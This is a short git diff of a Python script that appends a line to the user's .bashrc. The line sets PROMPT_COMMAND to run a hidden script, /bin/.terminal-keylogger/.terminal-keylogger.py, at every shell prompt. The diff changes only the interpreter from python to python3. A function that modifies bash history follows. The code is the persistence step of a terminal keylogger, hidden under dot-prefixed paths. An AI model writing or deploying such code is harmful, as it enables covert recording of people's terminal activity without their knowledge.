@@ -21,7 +21,7 @@ def append_to_bashrc(line):
     with open(f"{home_directory}/.bashrc", "a") as bashrc_file:
         bashrc_file.write(line + "\n")
 
-line_to_append = 'export PROMPT_COMMAND="history -a;python /bin/.terminal-keylogger/.terminal-keylogger.py;$PROMPT_COMMAND"'
+line_to_append = 'export PROMPT_COMMAND="history -a;python3 /bin/.terminal-keylogger/.terminal-keylogger.py;$PROMPT_COMMAND"'
 append_to_bashrc(line_to_append)
 
 def modify_bash_history(input_file, output_file):
